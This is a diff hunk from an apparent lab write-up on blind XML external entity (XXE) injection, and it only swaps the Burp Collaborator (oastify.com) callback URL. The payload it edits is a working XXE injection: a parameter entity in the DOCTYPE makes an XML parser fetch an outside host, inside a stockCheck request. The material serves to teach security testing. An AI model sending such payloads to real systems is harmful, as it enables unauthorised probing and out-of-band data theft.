@@ -62,7 +62,7 @@ First we will declare a DOCTYPE eith parameterized entitites (**%**) which conta
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ibxj9hi7igb643lzee9r5ghu7ldc11.oastify.com"> %xxe; ]> 
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://sd9y3po3qry9jo5vf4684x8de4ku8j.oastify.com"> %xxe; ]> 
  <productId>% 1</productId>
  <storeId>1</storeId>
 </stockCheck>
